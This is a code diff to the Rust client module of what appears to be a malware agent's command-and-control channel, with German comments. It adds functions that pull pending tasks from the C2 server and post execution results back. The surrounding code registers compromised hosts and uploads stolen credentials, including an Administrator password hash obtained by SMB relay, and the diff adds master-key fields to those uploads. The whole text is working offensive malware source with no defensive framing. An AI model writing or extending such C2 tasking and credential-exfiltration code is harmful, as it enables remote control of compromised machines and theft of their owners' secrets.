@@ -8,7 +8,10 @@
 //! Die Nachrichten selbst sind nicht hier definiert, sondern in
 //! `kx_core::c2` — der Agent und der Server sprechen denselben Vertrag.
 
-use kx_core::c2::{RegisterRequest, SecretUpload, PATH_REGISTER, PATH_SECRETS};
+use kx_core::c2::{
+    RegisterRequest, SecretUpload, Task, TaskResultRequest, PATH_REGISTER, PATH_SECRETS,
+    PATH_TASKS, PATH_TASKS_RESULT,
+};
 use thiserror::Error;
 use ureq::Agent;
 
@@ -76,6 +79,40 @@ impl C2Client {
             .map_err(|e| C2Error::Http(e.to_string()))?;
         ensure_ok(resp).await
     }
+
+    /// Holt die offenen Tasks unter `/api/tasks`.
+    ///
+    /// Der Agent filtert selbst nach seiner eigenen Host-Kennung und dem
+    /// Status `pending` — der Server kennt keinen Auftrag, der nur für einen
+    /// bestimmten Agenten bestimmt ist.
+    pub async fn fetch_tasks(&self) -> Result<Vec<Task>, C2Error> {
+        let url = format!("{}{PATH_TASKS}", self.base_url);
+        let resp = self
+            .agent
+            .get(&url)
+            .set("Authorization", &format!("Bearer {}", self.token))
+            .call()
+            .map_err(|e| C2Error::Http(e.to_string()))?;
+        let body = resp
+            .into_string()
+            .map_err(|e| C2Error::Http(e.to_string()))?;
+        serde_json::from_str(&body).map_err(|e| C2Error::Json(e.to_string()))
+    }
+
+    /// Meldet das Ergebnis eines ausgeführten Tasks unter
+    /// `/api/tasks/result` zurück.
+    pub async fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), C2Error> {
+        let url = format!("{}{PATH_TASKS_RESULT}", self.base_url);
+        let resp = self
+            .agent
+            .post(&url)
+            .set("Authorization", &format!("Bearer {}", self.token))
+            .send_json(
+                ureq::serde_json::to_value(report).map_err(|e| C2Error::Json(e.to_string()))?,
+            )
+            .map_err(|e| C2Error::Http(e.to_string()))?;
+        ensure_ok(resp).await
+    }
 }
 
 /// Prüft den HTTP-Status; gibt bei Fehlern einen C2Error zurück.
@@ -101,6 +138,8 @@ mod tests {
             hostname: Some("srv1".into()),
             os: Some("Windows".into()),
             status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
+            sealed_master: None,
+            master_key: None,
         };
         let v = ureq::serde_json::to_value(&req).unwrap();
         assert_eq!(v["ip"], "192.168.1.5");
@@ -117,6 +156,7 @@ mod tests {
             username: "Administrator".into(),
             password: "hash".into(),
             source: Some("smb_relay".into()),
+            master_key: None,
         };
         let v = ureq::serde_json::to_value(&upload).unwrap();
         assert_eq!(v["host_id"], "192.168.1.5");
@@ -127,5 +167,7 @@ mod tests {
     fn client_uses_the_contract_paths() {
         assert_eq!(PATH_REGISTER, "/api/register");
         assert_eq!(PATH_SECRETS, "/api/secrets");
+        assert_eq!(PATH_TASKS, "/api/tasks");
+        assert_eq!(PATH_TASKS_RESULT, "/api/tasks/result");
     }
 }
